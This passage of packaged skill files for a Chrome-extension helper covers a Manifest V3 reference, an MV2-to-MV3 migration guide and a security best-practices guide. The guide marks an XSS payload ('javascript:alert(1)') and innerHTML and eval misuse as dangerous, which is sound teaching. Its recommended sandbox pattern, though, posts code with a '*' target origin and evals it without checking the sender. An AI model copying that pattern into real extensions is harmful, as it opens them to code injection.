                "content": "# Manifest V3 Complete Reference\n\n## Basic Structure\n\n```json\n{\n  \"manifest_version\": 3,\n  \"name\": \"Extension Name\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Brief description (max 132 chars for store)\"\n}\n```\n\n## Required Fields\n\n| Field | Type | Description |\n|-------|------|-------------|\n| `manifest_version` | integer | Must be `3` |\n| `name` | string | Extension name (max 45 chars) |\n| `version` | string | Version string (e.g., \"1.0.0\") |\n\n## Recommended Fields\n\n| Field | Type | Description |\n|-------|------|-------------|\n| `description` | string | Brief description |\n| `icons` | object | Extension icons |\n| `action` | object | Toolbar button config |\n\n---\n\n## Icons\n\n```json\n{\n  \"icons\": {\n    \"16\": \"icons/icon16.png\",\n    \"32\": \"icons/icon32.png\",\n    \"48\": \"icons/icon48.png\",\n    \"128\": \"icons/icon128.png\"\n  }\n}\n```\n\n| Size | Usage |\n|------|-------|\n| 16x16 | Favicon, toolbar |\n| 32x32 | Windows computers |\n| 48x48 | Extensions management page |\n| 128x128 | Chrome Web Store |\n\n---\n\n## Background Service Worker\n\n```json\n{\n  \"background\": {\n    \"service_worker\": \"background.js\",\n    \"type\": \"module\"\n  }\n}\n```\n\n| Property | Description |\n|----------|-------------|\n| `service_worker` | Path to service worker file |\n| `type` | Set to `\"module\"` for ES module support |\n\n**Key Differences from MV2:**\n- No persistent background pages\n- Service worker terminates after ~30s idle\n- Must use `chrome.alarms` for periodic tasks\n- Event listeners must be registered at top level\n\n---\n\n## Action (Toolbar Button)\n\n```json\n{\n  \"action\": {\n    \"default_icon\": {\n      \"16\": \"icons/icon16.png\",\n      \"32\": \"icons/icon32.png\"\n    },\n    \"default_title\": \"Click to activate\",\n    \"default_popup\": \"popup.html\"\n  }\n}\n```\n\n| Property | Description |\n|----------|-------------|\n| `default_icon` | Icon shown in toolbar |\n| `default_title` | Tooltip text |\n| `default_popup` | Popup HTML file |\n\n**Note:** Replaces both `browser_action` and `page_action` from MV2.\n\n---\n\n## Content Scripts\n\n```json\n{\n  \"content_scripts\": [\n    {\n      \"matches\": [\"*://*.example.com/*\"],\n      \"js\": [\"content.js\"],\n      \"css\": [\"content.css\"],\n      \"run_at\": \"document_idle\",\n      \"all_frames\": false,\n      \"match_about_blank\": false,\n      \"match_origin_as_fallback\": false\n    }\n  ]\n}\n```\n\n| Property | Description |\n|----------|-------------|\n| `matches` | URL patterns to match (required) |\n| `exclude_matches` | URL patterns to exclude |\n| `js` | JavaScript files to inject |\n| `css` | CSS files to inject |\n| `run_at` | When to inject (`document_start`, `document_end`, `document_idle`) |\n| `all_frames` | Inject into all frames |\n| `match_about_blank` | Match about:blank frames |\n| `world` | Execution world (`ISOLATED` or `MAIN`) |\n\n### Match Patterns\n\n```\n<scheme>://<host><path>\n\nExamples:\n*://*.google.com/*       - All Google domains\nhttps://example.com/*    - Only HTTPS example.com\n*://*/api/*              - Any URL with /api/ path\n<all_urls>               - All URLs (requires justification)\n```\n\n---\n\n## Side Panel\n\n```json\n{\n  \"side_panel\": {\n    \"default_path\": \"sidepanel.html\"\n  }\n}\n```\n\n**Required Permission:** `\"sidePanel\"`\n\n---\n\n## Permissions\n\n### API Permissions\n\n```json\n{\n  \"permissions\": [\n    \"storage\",\n    \"tabs\",\n    \"activeTab\",\n    \"alarms\",\n    \"notifications\",\n    \"contextMenus\",\n    \"sidePanel\"\n  ]\n}\n```\n\n| Permission | Description |\n|------------|-------------|\n| `activeTab` | Access active tab on user gesture |\n| `alarms` | Schedule code to run |\n| `bookmarks` | Read/write bookmarks |\n| `contextMenus` | Add context menu items |\n| `cookies` | Read/write cookies |\n| `history` | Read/write history |\n| `identity` | OAuth authentication |\n| `notifications` | Show notifications |\n| `scripting` | Execute scripts programmatically |\n| `sidePanel` | Use side panel |\n| `storage` | Use chrome.storage API |\n| `tabs` | Access tab information |\n| `webNavigation` | Track page navigation |\n\n### Host Permissions\n\n```json\n{\n  \"host_permissions\": [\n    \"*://*.example.com/*\",\n    \"https://api.service.com/*\"\n  ]\n}\n```\n\n**Separated from permissions in MV3** for clearer security model.\n\n### Optional Permissions\n\n```json\n{\n  \"optional_permissions\": [\"tabs\", \"history\"],\n  \"optional_host_permissions\": [\"*://*.optional-site.com/*\"]\n}\n```\n\nRequest at runtime:\n```javascript\nchrome.permissions.request({\n  permissions: ['tabs'],\n  origins: ['*://*.optional-site.com/*']\n});\n```\n\n---\n\n## Web Accessible Resources\n\n```json\n{\n  \"web_accessible_resources\": [\n    {\n      \"resources\": [\"images/*.png\", \"scripts/inject.js\"],\n      \"matches\": [\"*://*.example.com/*\"]\n    },\n    {\n      \"resources\": [\"fonts/*\"],\n      \"matches\": [\"<all_urls>\"],\n      \"use_dynamic_url\": true\n    }\n  ]\n}\n```\n\n| Property | Description |\n|----------|-------------|\n| `resources` | Files accessible from web pages |\n| `matches` | Which pages can access |\n| `extension_ids` | Which extensions can access |\n| `use_dynamic_url` | Generate unique URL per session |\n\n---\n\n## Content Security Policy\n\n```json\n{\n  \"content_security_policy\": {\n    \"extension_pages\": \"script-src 'self'; object-src 'self'\",\n    \"sandbox\": \"sandbox allow-scripts; script-src 'self'\"\n  }\n}\n```\n\n**MV3 Restrictions:**\n- No `unsafe-eval`\n- No remote code execution\n- No inline scripts in HTML\n\n---\n\n## Declarative Net Request\n\n```json\n{\n  \"declarative_net_request\": {\n    \"rule_resources\": [\n      {\n        \"id\": \"ruleset_1\",\n        \"enabled\": true,\n        \"path\": \"rules.json\"\n      }\n    ]\n  },\n  \"permissions\": [\"declarativeNetRequest\"]\n}\n```\n\n**rules.json:**\n```json\n[\n  {\n    \"id\": 1,\n    \"priority\": 1,\n    \"action\": { \"type\": \"block\" },\n    \"condition\": {\n      \"urlFilter\": \"||ads.example.com\",\n      \"resourceTypes\": [\"script\", \"image\"]\n    }\n  }\n]\n```\n\n---\n\n## Options Page\n\n```json\n{\n  \"options_page\": \"options.html\",\n\n  // OR embedded in extensions page:\n  \"options_ui\": {\n    \"page\": \"options.html\",\n    \"open_in_tab\": false\n  }\n}\n```\n\n---\n\n## Commands (Keyboard Shortcuts)\n\n```json\n{\n  \"commands\": {\n    \"_execute_action\": {\n      \"suggested_key\": {\n        \"default\": \"Ctrl+Shift+Y\",\n        \"mac\": \"Command+Shift+Y\"\n      },\n      \"description\": \"Activate extension\"\n    },\n    \"custom_command\": {\n      \"suggested_key\": {\n        \"default\": \"Ctrl+Shift+U\"\n      },\n      \"description\": \"Custom action\"\n    }\n  }\n}\n```\n\n---\n\n## Externally Connectable\n\n```json\n{\n  \"externally_connectable\": {\n    \"ids\": [\"other_extension_id\"],\n    \"matches\": [\"https://example.com/*\"]\n  }\n}\n```\n\nAllows external websites or extensions to send messages.\n\n---\n\n## Incognito Mode\n\n```json\n{\n  \"incognito\": \"spanning\"\n}\n```\n\n| Value | Description |\n|-------|-------------|\n| `spanning` | Single instance for normal and incognito |\n| `split` | Separate instances |\n| `not_allowed` | Disabled in incognito |\n\n---\n\n## Minimum Chrome Version\n\n```json\n{\n  \"minimum_chrome_version\": \"88\"\n}\n```\n\n---\n\n## Localization\n\n```json\n{\n  \"name\": \"__MSG_extension_name__\",\n  \"default_locale\": \"en\"\n}\n```\n\nRequires `_locales/en/messages.json`:\n```json\n{\n  \"extension_name\": {\n    \"message\": \"My Extension\",\n    \"description\": \"Extension name\"\n  }\n}\n```\n\n---\n\n## Complete Example\n\n```json\n{\n  \"manifest_version\": 3,\n  \"name\": \"My Extension\",\n  \"version\": \"1.0.0\",\n  \"description\": \"A helpful Chrome extension\",\n\n  \"icons\": {\n    \"16\": \"icons/icon16.png\",\n    \"48\": \"icons/icon48.png\",\n    \"128\": \"icons/icon128.png\"\n  },\n\n  \"action\": {\n    \"default_popup\": \"popup.html\",\n    \"default_icon\": {\n      \"16\": \"icons/icon16.png\",\n      \"32\": \"icons/icon32.png\"\n    }\n  },\n\n  \"background\": {\n    \"service_worker\": \"background.js\",\n    \"type\": \"module\"\n  },\n\n  \"content_scripts\": [{\n    \"matches\": [\"*://*.example.com/*\"],\n    \"js\": [\"content.js\"],\n    \"css\": [\"content.css\"]\n  }],\n\n  \"side_panel\": {\n    \"default_path\": \"sidepanel.html\"\n  },\n\n  \"permissions\": [\n    \"storage\",\n    \"activeTab\",\n    \"sidePanel\",\n    \"alarms\"\n  ],\n\n  \"host_permissions\": [\n    \"*://*.example.com/*\"\n  ],\n\n  \"web_accessible_resources\": [{\n    \"resources\": [\"images/*\"],\n    \"matches\": [\"*://*.example.com/*\"]\n  }],\n\n  \"options_ui\": {\n    \"page\": \"options.html\",\n    \"open_in_tab\": false\n  },\n\n  \"commands\": {\n    \"_execute_action\": {\n      \"suggested_key\": {\n        \"default\": \"Ctrl+Shift+E\"\n      }\n    }\n  }\n}\n```"
              },
              {
                "name": "migration-guide",
                "description": "Manifest V2 to V3 migration guide covering background page to service worker, API changes, webRequest to declarativeNetRequest, remote code removal, executeScript changes, and persistence patterns. Use when upgrading extensions to Manifest V3.",
                "path": "chrome-extension-expert/skills/migration-guide/SKILL.md",
                "frontmatter": {
                  "name": "migration-guide",
                  "description": "Manifest V2 to V3 migration guide covering background page to service worker, API changes, webRequest to declarativeNetRequest, remote code removal, executeScript changes, and persistence patterns. Use when upgrading extensions to Manifest V3."
                },
                "content": "# Manifest V2 to V3 Migration Guide\n\n## Overview of Changes\n\n| Feature | Manifest V2 | Manifest V3 |\n|---------|-------------|-------------|\n| Background | Persistent page | Service worker |\n| Remote code | Allowed | Forbidden |\n| Web requests | webRequest API | declarativeNetRequest |\n| Host permissions | In permissions | Separate field |\n| Content scripts | executeScript string | executeScript files/func |\n| CSP | Customizable | Restricted |\n| Action | browser_action/page_action | action |\n\n---\n\n## Manifest Changes\n\n### Basic Manifest Update\n\n**MV2:**\n```json\n{\n  \"manifest_version\": 2,\n  \"name\": \"My Extension\",\n  \"version\": \"1.0\",\n  \"browser_action\": {\n    \"default_popup\": \"popup.html\",\n    \"default_icon\": \"icon.png\"\n  },\n  \"background\": {\n    \"scripts\": [\"background.js\"],\n    \"persistent\": false\n  },\n  \"permissions\": [\n    \"tabs\",\n    \"storage\",\n    \"*://*.example.com/*\"\n  ]\n}\n```\n\n**MV3:**\n```json\n{\n  \"manifest_version\": 3,\n  \"name\": \"My Extension\",\n  \"version\": \"1.0\",\n  \"action\": {\n    \"default_popup\": \"popup.html\",\n    \"default_icon\": \"icon.png\"\n  },\n  \"background\": {\n    \"service_worker\": \"background.js\",\n    \"type\": \"module\"\n  },\n  \"permissions\": [\n    \"tabs\",\n    \"storage\"\n  ],\n  \"host_permissions\": [\n    \"*://*.example.com/*\"\n  ]\n}\n```\n\n### Key Changes\n\n1. `browser_action` / `page_action` → `action`\n2. `background.scripts` → `background.service_worker`\n3. Host permissions moved to `host_permissions`\n4. Add `\"type\": \"module\"` for ES modules\n\n---\n\n## Background Page → Service Worker\n\n### Key Differences\n\n| Background Page | Service Worker |\n|-----------------|----------------|\n| Persistent (optional) | Always terminates |\n| DOM access | No DOM |\n| window object | No window |\n| localStorage | No localStorage |\n| XMLHttpRequest | fetch only |\n| setTimeout reliable | setTimeout may not fire |\n\n### Migration Steps\n\n**1. Remove DOM dependencies:**\n\n```javascript\n// MV2 - Using DOM\nconst parser = new DOMParser();\nconst doc = parser.parseFromString(html, 'text/html');\n\n// MV3 - Use offscreen document\nawait chrome.offscreen.createDocument({\n  url: 'offscreen.html',\n  reasons: ['DOM_PARSER'],\n  justification: 'Parse HTML content'\n});\n// Send HTML to offscreen document for parsing\n```\n\n**2. Replace window with self:**\n\n```javascript\n// MV2\nwindow.addEventListener('message', handler);\n\n// MV3\nself.addEventListener('message', handler);\n```\n\n**3. Handle termination:**\n\n```javascript\n// MV2 - Persistent state\nlet cachedData = null;\n\n// MV3 - Must persist to storage\nasync function getCachedData() {\n  const { cachedData } = await chrome.storage.session.get('cachedData');\n  return cachedData;\n}\n\nasync function setCachedData(data) {\n  await chrome.storage.session.set({ cachedData: data });\n}\n```\n\n**4. Register listeners at top level:**\n\n```javascript\n// MV2 - Could add listeners anytime\nsetTimeout(() => {\n  chrome.runtime.onMessage.addListener(handler);\n}, 1000);\n\n// MV3 - Must be at top level\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  // Can still handle asynchronously\n  handleMessage(message).then(sendResponse);\n  return true;\n});\n```\n\n---\n\n## Persistence Patterns\n\n### Using Alarms\n\n```javascript\n// MV2 - setInterval\nsetInterval(checkForUpdates, 60000);\n\n// MV3 - Alarms\nchrome.alarms.create('checkUpdates', { periodInMinutes: 1 });\n\nchrome.alarms.onAlarm.addListener((alarm) => {\n  if (alarm.name === 'checkUpdates') {\n    checkForUpdates();\n  }\n});\n```\n\n### State Persistence\n\n```javascript\n// Service worker can terminate anytime\n// Must save state to storage\n\n// On state change\nasync function updateState(newState) {\n  state = { ...state, ...newState };\n  await chrome.storage.session.set({ state });\n}\n\n// On service worker start\nasync function restoreState() {\n  const { state } = await chrome.storage.session.get('state');\n  return state || initialState;\n}\n\n// Restore state immediately on load\nlet state;\nrestoreState().then(s => state = s);\n```\n\n### Keep-Alive Patterns (Use Sparingly)\n\n```javascript\n// For long-running operations\n// Create an alarm to keep service worker alive\nasync function startLongOperation() {\n  chrome.alarms.create('keepAlive', { periodInMinutes: 0.5 });\n\n  try {\n    await longOperation();\n  } finally {\n    chrome.alarms.clear('keepAlive');\n  }\n}\n\nchrome.alarms.onAlarm.addListener((alarm) => {\n  if (alarm.name === 'keepAlive') {\n    // Just keeps worker alive\n  }\n});\n```\n\n---\n\n## webRequest → declarativeNetRequest\n\n### Migration Comparison\n\n**MV2 - webRequest (blocking):**\n```javascript\nchrome.webRequest.onBeforeRequest.addListener(\n  (details) => {\n    if (shouldBlock(details.url)) {\n      return { cancel: true };\n    }\n  },\n  { urls: ['<all_urls>'] },\n  ['blocking']\n);\n```\n\n**MV3 - declarativeNetRequest:**\n\n**manifest.json:**\n```json\n{\n  \"permissions\": [\"declarativeNetRequest\"],\n  \"declarative_net_request\": {\n    \"rule_resources\": [{\n      \"id\": \"ruleset_1\",\n      \"enabled\": true,\n      \"path\": \"rules.json\"\n    }]\n  }\n}\n```\n\n**rules.json:**\n```json\n[\n  {\n    \"id\": 1,\n    \"priority\": 1,\n    \"action\": { \"type\": \"block\" },\n    \"condition\": {\n      \"urlFilter\": \"||ads.example.com\",\n      \"resourceTypes\": [\"script\", \"image\", \"xmlhttprequest\"]\n    }\n  },\n  {\n    \"id\": 2,\n    \"priority\": 1,\n    \"action\": {\n      \"type\": \"redirect\",\n      \"redirect\": { \"extensionPath\": \"/blocked.html\" }\n    },\n    \"condition\": {\n      \"urlFilter\": \"||tracking.com/*\",\n      \"resourceTypes\": [\"main_frame\"]\n    }\n  }\n]\n```\n\n### Dynamic Rules\n\n```javascript\n// Add rules at runtime\nawait chrome.declarativeNetRequest.updateDynamicRules({\n  addRules: [{\n    id: 100,\n    priority: 1,\n    action: { type: 'block' },\n    condition: {\n      urlFilter: userBlockedDomain,\n      resourceTypes: ['main_frame', 'sub_frame']\n    }\n  }],\n  removeRuleIds: [99]  // Remove old rule\n});\n\n// Session rules (cleared on browser restart)\nawait chrome.declarativeNetRequest.updateSessionRules({\n  addRules: [/* ... */]\n});\n```\n\n### When webRequest is Still Needed\n\nSome use cases still require webRequest (without blocking):\n- Observing requests (non-blocking)\n- Reading response headers\n- Authentication handling\n\n```json\n{\n  \"permissions\": [\"webRequest\"],\n  \"host_permissions\": [\"*://*.example.com/*\"]\n}\n```\n\n```javascript\n// Non-blocking observation still works\nchrome.webRequest.onCompleted.addListener(\n  (details) => {\n    logRequest(details);\n  },\n  { urls: ['*://*.example.com/*'] }\n);\n```\n\n---\n\n## Remote Code Removal\n\n### Identifying Remote Code\n\n**Not Allowed in MV3:**\n```javascript\n// Loading external scripts\nconst script = document.createElement('script');\nscript.src = 'https://external.com/script.js';  // Blocked\n\n// Eval and Function constructor\neval(code);  // Blocked\nnew Function(code);  // Blocked\n\n// External script tags in HTML\n<script src=\"https://cdn.example.com/lib.js\"></script>  // Blocked\n```\n\n### Solutions\n\n**1. Bundle all dependencies:**\n```bash\nnpm install library\n# Bundle with webpack/rollup/esbuild\n```\n\n**2. For dynamic configuration:**\n```javascript\n// MV2 - Fetch and eval config\nconst config = await fetch('https://api.com/config.js');\neval(config);\n\n// MV3 - Fetch JSON data only\nconst response = await fetch('https://api.com/config.json');\nconst config = await response.json();\n// Use config data, don't execute code\n```\n\n**3. For user scripts (sandbox):**\n```json\n{\n  \"sandbox\": {\n    \"pages\": [\"sandbox.html\"]\n  }\n}\n```\n\n```javascript\n// sandbox.html can use eval\n// Communicate via postMessage\nconst frame = document.getElementById('sandbox');\nframe.contentWindow.postMessage({ code: userCode }, '*');\n```\n\n---\n\n## executeScript Changes\n\n### MV2 Style\n\n```javascript\n// Execute string of code\nchrome.tabs.executeScript(tabId, {\n  code: 'document.body.style.background = \"red\"'\n});\n\n// Execute file\nchrome.tabs.executeScript(tabId, {\n  file: 'content.js'\n});\n```\n\n### MV3 Style\n\n```javascript\n// Execute function\nawait chrome.scripting.executeScript({\n  target: { tabId },\n  func: () => {\n    document.body.style.background = 'red';\n  }\n});\n\n// Execute function with arguments\nawait chrome.scripting.executeScript({\n  target: { tabId },\n  func: (color) => {\n    document.body.style.background = color;\n  },\n  args: ['red']\n});\n\n// Execute file\nawait chrome.scripting.executeScript({\n  target: { tabId },\n  files: ['content.js']\n});\n\n// Specify world\nawait chrome.scripting.executeScript({\n  target: { tabId },\n  world: 'MAIN',  // Access page's JavaScript context\n  func: () => window.somePageVariable\n});\n```\n\n### insertCSS Changes\n\n```javascript\n// MV2\nchrome.tabs.insertCSS(tabId, { code: 'body { color: red; }' });\n\n// MV3\nawait chrome.scripting.insertCSS({\n  target: { tabId },\n  css: 'body { color: red; }'\n});\n\n// Or file\nawait chrome.scripting.insertCSS({\n  target: { tabId },\n  files: ['styles.css']\n});\n```\n\n---\n\n## Action API Changes\n\n### browser_action / page_action → action\n\n```javascript\n// MV2\nchrome.browserAction.setIcon({ path: 'icon.png' });\nchrome.browserAction.setBadgeText({ text: '5' });\nchrome.browserAction.onClicked.addListener(handler);\n\nchrome.pageAction.show(tabId);\n\n// MV3\nchrome.action.setIcon({ path: 'icon.png' });\nchrome.action.setBadgeText({ text: '5' });\nchrome.action.onClicked.addListener(handler);\n\n// No separate pageAction - use action for all\nchrome.action.enable(tabId);\nchrome.action.disable(tabId);\n```\n\n---\n\n## Web Accessible Resources\n\n### MV2\n\n```json\n{\n  \"web_accessible_resources\": [\n    \"images/*\",\n    \"script.js\"\n  ]\n}\n```\n\n### MV3\n\n```json\n{\n  \"web_accessible_resources\": [{\n    \"resources\": [\"images/*\", \"script.js\"],\n    \"matches\": [\"*://*.example.com/*\"]\n  }, {\n    \"resources\": [\"public/*\"],\n    \"matches\": [\"<all_urls>\"],\n    \"use_dynamic_url\": true\n  }]\n}\n```\n\n---\n\n## Content Security Policy\n\n### MV2 (Flexible)\n\n```json\n{\n  \"content_security_policy\": \"script-src 'self' 'unsafe-eval'; object-src 'self'\"\n}\n```\n\n### MV3 (Restricted)\n\n```json\n{\n  \"content_security_policy\": {\n    \"extension_pages\": \"script-src 'self'; object-src 'self'\"\n  }\n}\n```\n\n**Restrictions:**\n- No `unsafe-eval`\n- No `unsafe-inline`\n- No remote script sources\n- `wasm-unsafe-eval` allowed for WebAssembly\n\n---\n\n## Migration Checklist\n\n### Manifest\n- [ ] Change `manifest_version` to 3\n- [ ] Replace `browser_action`/`page_action` with `action`\n- [ ] Move host permissions to `host_permissions`\n- [ ] Update `background` to `service_worker`\n- [ ] Update `web_accessible_resources` format\n- [ ] Remove forbidden CSP directives\n\n### Background Script\n- [ ] Convert to service worker\n- [ ] Remove DOM dependencies\n- [ ] Replace `window` with `self`\n- [ ] Move state to storage\n- [ ] Register listeners at top level\n- [ ] Replace setInterval with alarms\n- [ ] Handle service worker termination\n\n### Content Scripts\n- [ ] Update `executeScript` calls\n- [ ] Update `insertCSS` calls\n- [ ] Use `chrome.scripting` API\n\n### Network\n- [ ] Replace `webRequest` blocking with `declarativeNetRequest`\n- [ ] Create static rule files\n- [ ] Implement dynamic rules if needed\n\n### Remote Code\n- [ ] Bundle all external scripts\n- [ ] Remove eval/Function usage\n- [ ] Use sandbox for dynamic code\n- [ ] Convert remote config to JSON\n\n### Testing\n- [ ] Test all features\n- [ ] Verify service worker lifecycle\n- [ ] Check permission functionality\n- [ ] Test on multiple sites\n- [ ] Verify no console errors\n\n---\n\n## Common Migration Issues\n\n### Issue: Service Worker Terminates\n\n**Problem:** State lost when worker terminates\n\n**Solution:**\n```javascript\n// Use storage instead of variables\nchrome.storage.session.set({ key: value });\n\n// Restore on start\nchrome.storage.session.get('key').then(({ key }) => {\n  // Use restored value\n});\n```\n\n### Issue: DOM Parser Needed\n\n**Problem:** No DOMParser in service worker\n\n**Solution:** Use offscreen document\n```javascript\nawait chrome.offscreen.createDocument({\n  url: 'offscreen.html',\n  reasons: ['DOM_PARSER'],\n  justification: 'Parse HTML'\n});\n```\n\n### Issue: Blocking Requests\n\n**Problem:** webRequest blocking not available\n\n**Solution:** Use declarativeNetRequest with static rules\n\n### Issue: Dynamic Code\n\n**Problem:** Can't execute user-provided code\n\n**Solution:** Sandbox page with postMessage communication\n\n### Issue: External Libraries\n\n**Problem:** Can't load from CDN\n\n**Solution:** Bundle with npm/webpack"
              },
              {
                "name": "security-best-practices",
                "description": "Security best practices for Chrome Extensions covering principle of least privilege, CSP configuration, XSS prevention, secure messaging, safe DOM manipulation, data protection, and permission strategies. Essential for building secure extensions.",
                "path": "chrome-extension-expert/skills/security-best-practices/SKILL.md",
                "frontmatter": {
                  "name": "security-best-practices",
                  "description": "Security best practices for Chrome Extensions covering principle of least privilege, CSP configuration, XSS prevention, secure messaging, safe DOM manipulation, data protection, and permission strategies. Essential for building secure extensions."
                },
                "content": "# Chrome Extension Security Best Practices\n\n## Principle of Least Privilege\n\n### Permission Strategy\n\n**Request minimum permissions:**\n```json\n{\n  \"permissions\": [\n    \"storage\",      // Only what you need\n    \"activeTab\"     // Prefer over \"tabs\" when possible\n  ],\n  \"optional_permissions\": [\n    \"history\",      // Request when needed\n    \"bookmarks\"\n  ],\n  \"host_permissions\": [\n    \"*://*.specific-domain.com/*\"  // Scope narrowly\n  ]\n}\n```\n\n**Permission Comparison:**\n\n| Permission | Access Level | When to Use |\n|------------|--------------|-------------|\n| `activeTab` | Current tab on click | Prefer when possible |\n| `tabs` | All tab URLs/titles | Only if listing tabs |\n| `<all_urls>` | All websites | Rarely justified |\n| `host_permissions` | Specific domains | Scope as narrowly as possible |\n\n### activeTab vs tabs\n\n```javascript\n// activeTab - only works after user gesture\n// Access granted only for current tab, only during action\n\n// tabs - always has access\n// Can see URLs of all tabs\nconst tabs = await chrome.tabs.query({});\ntabs.forEach(t => console.log(t.url)); // Privacy concern!\n```\n\n### Optional Permissions\n\n```javascript\n// Request only when needed\nasync function enableAdvancedFeature() {\n  const granted = await chrome.permissions.request({\n    permissions: ['history'],\n    origins: ['*://*.example.com/*']\n  });\n\n  if (granted) {\n    // Enable feature\n  } else {\n    // Show explanation, offer alternative\n  }\n}\n\n// Remove when no longer needed\nawait chrome.permissions.remove({\n  permissions: ['history']\n});\n```\n\n---\n\n## Content Security Policy (CSP)\n\n### Manifest V3 CSP\n\n```json\n{\n  \"content_security_policy\": {\n    \"extension_pages\": \"script-src 'self'; object-src 'self'\",\n    \"sandbox\": \"sandbox allow-scripts; script-src 'self' 'unsafe-eval'\"\n  }\n}\n```\n\n### CSP Restrictions in MV3\n\n**NOT ALLOWED:**\n- `unsafe-eval` (except in sandbox)\n- `unsafe-inline`\n- Remote code execution\n- External script sources\n\n**ALLOWED:**\n- `'self'` - Extension's own scripts\n- `'wasm-unsafe-eval'` - WebAssembly\n- Specific extension URLs\n\n### Working Within CSP\n\n```javascript\n// WRONG - Blocked by CSP\neval('console.log(\"hello\")');\nnew Function('return 1 + 1');\n\n// WRONG - Inline scripts blocked\n// <script>alert('hello')</script>\n\n// CORRECT - External script file\n// <script src=\"script.js\"></script>\n\n// For dynamic code needs, use sandbox\n// Create sandboxed iframe, communicate via postMessage\n```\n\n### Sandbox for Dynamic Code\n\n```json\n{\n  \"sandbox\": {\n    \"pages\": [\"sandbox.html\"]\n  }\n}\n```\n\n```javascript\n// sandbox.html can use eval\n// Communicate via postMessage\n// Main extension → sandbox\nframe.contentWindow.postMessage({ code: '1 + 1' }, '*');\n\n// sandbox → main extension\nparent.postMessage({ result: eval(code) }, '*');\n```\n\n---\n\n## XSS Prevention\n\n### DOM Manipulation\n\n```javascript\n// DANGEROUS - XSS vulnerability\nelement.innerHTML = userInput;\ndocument.write(userInput);\n\n// SAFE - Text content only\nelement.textContent = userInput;\n\n// SAFE - Attribute setting\nelement.setAttribute('title', userInput);\n// But NOT: element.setAttribute('href', 'javascript:' + userInput);\n\n// SAFE - DOM creation\nconst div = document.createElement('div');\ndiv.textContent = userInput;\nparent.appendChild(div);\n```\n\n### If HTML is Required\n\n```javascript\n// Use a sanitizer library\nimport DOMPurify from 'dompurify';\n\nconst clean = DOMPurify.sanitize(userInput, {\n  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],\n  ALLOWED_ATTR: ['href']\n});\nelement.innerHTML = clean;\n\n// Or use template literals carefully\nfunction createItem(title, description) {\n  const item = document.createElement('div');\n  item.className = 'item';\n\n  const titleEl = document.createElement('h3');\n  titleEl.textContent = title;  // Safe\n\n  const descEl = document.createElement('p');\n  descEl.textContent = description;  // Safe\n\n  item.appendChild(titleEl);\n  item.appendChild(descEl);\n  return item;\n}\n```\n\n### URL Validation\n\n```javascript\n// DANGEROUS - XSS via javascript: URLs\nconst url = userInput;\nelement.href = url; // If url is \"javascript:alert(1)\"\n\n// SAFE - Validate URL protocol\nfunction isValidUrl(string) {\n  try {\n    const url = new URL(string);\n    return url.protocol === 'http:' || url.protocol === 'https:';\n  } catch {\n    return false;\n  }\n}\n\nif (isValidUrl(userInput)) {\n  element.href = userInput;\n}\n```\n\n---\n\n## Secure Message Passing\n\n### Validate Message Sources\n\n```javascript\n// background.js\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  // Verify sender is from this extension\n  if (sender.id !== chrome.runtime.id) {\n    console.warn('Message from unknown source');\n    return;\n  }\n\n  // Verify expected origin for content scripts\n  if (sender.tab) {\n    const allowedOrigins = ['https://example.com', 'https://app.example.com'];\n    const origin = new URL(sender.url).origin;\n    if (!allowedOrigins.includes(origin)) {\n      console.warn('Message from unexpected origin:', origin);\n      return;\n    }\n  }\n\n  // Process message\n});\n```\n\n### Validate Message Content\n\n```javascript\n// Define expected message schema\nconst messageSchemas = {\n  SAVE_DATA: {\n    type: 'object',\n    required: ['url', 'title'],\n    properties: {\n      url: { type: 'string', pattern: '^https?://' },\n      title: { type: 'string', maxLength: 500 }\n    }\n  }\n};\n\nfunction validateMessage(message) {\n  const schema = messageSchemas[message.type];\n  if (!schema) {\n    return false;\n  }\n\n  // Validate against schema\n  // Use a validation library like ajv in production\n  return isValidAgainstSchema(message.data, schema);\n}\n\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  if (!validateMessage(message)) {\n    sendResponse({ error: 'Invalid message format' });\n    return;\n  }\n  // Process valid message\n});\n```\n\n### External Message Security\n\n```json\n{\n  \"externally_connectable\": {\n    \"matches\": [\n      \"https://yourdomain.com/*\"\n    ]\n  }\n}\n```\n\n```javascript\n// Only specific domains can send messages\nchrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {\n  // sender.url is verified by Chrome against externally_connectable\n  // Still validate message content\n  if (!isValidExternalMessage(message)) {\n    sendResponse({ error: 'Invalid' });\n    return;\n  }\n});\n```\n\n---\n\n## Secure Storage\n\n### Sensitive Data\n\n```javascript\n// DON'T store in plain text\nawait chrome.storage.local.set({\n  apiKey: 'sk-1234567890'  // BAD!\n});\n\n// DO encrypt sensitive data\nasync function encryptAndStore(key, value) {\n  const encrypted = await encrypt(value);  // Use Web Crypto API\n  await chrome.storage.local.set({ [key]: encrypted });\n}\n\n// Or better: Don't store sensitive data at all\n// Use OAuth tokens that can be revoked\n// Use session storage for temporary auth\n```\n\n### Web Crypto API\n\n```javascript\nasync function generateKey() {\n  return await crypto.subtle.generateKey(\n    { name: 'AES-GCM', length: 256 },\n    true,\n    ['encrypt', 'decrypt']\n  );\n}\n\nasync function encrypt(data, key) {\n  const iv = crypto.getRandomValues(new Uint8Array(12));\n  const encoded = new TextEncoder().encode(JSON.stringify(data));\n\n  const encrypted = await crypto.subtle.encrypt(\n    { name: 'AES-GCM', iv },\n    key,\n    encoded\n  );\n\n  return {\n    iv: Array.from(iv),\n    data: Array.from(new Uint8Array(encrypted))\n  };\n}\n\nasync function decrypt(encrypted, key) {\n  const decrypted = await crypto.subtle.decrypt(\n    { name: 'AES-GCM', iv: new Uint8Array(encrypted.iv) },\n    key,\n    new Uint8Array(encrypted.data)\n  );\n\n  return JSON.parse(new TextDecoder().decode(decrypted));\n}\n```\n\n---\n\n## Network Security\n\n### HTTPS Only\n\n```javascript\n// Always use HTTPS\nconst API_URL = 'https://api.example.com';  // Never http://\n\n// Validate URLs before fetching\nfunction isSecureUrl(url) {\n  try {\n    return new URL(url).protocol === 'https:';\n  } catch {\n    return false;\n  }\n}\n\nasync function secureFetch(url, options = {}) {\n  if (!isSecureUrl(url)) {\n    throw new Error('Only HTTPS URLs allowed');\n  }\n  return fetch(url, options);\n}\n```\n\n### API Key Protection\n\n```javascript\n// DON'T include API keys in client code\nconst response = await fetch(`https://api.com?key=${API_KEY}`);  // Exposed!\n\n// DO use a backend 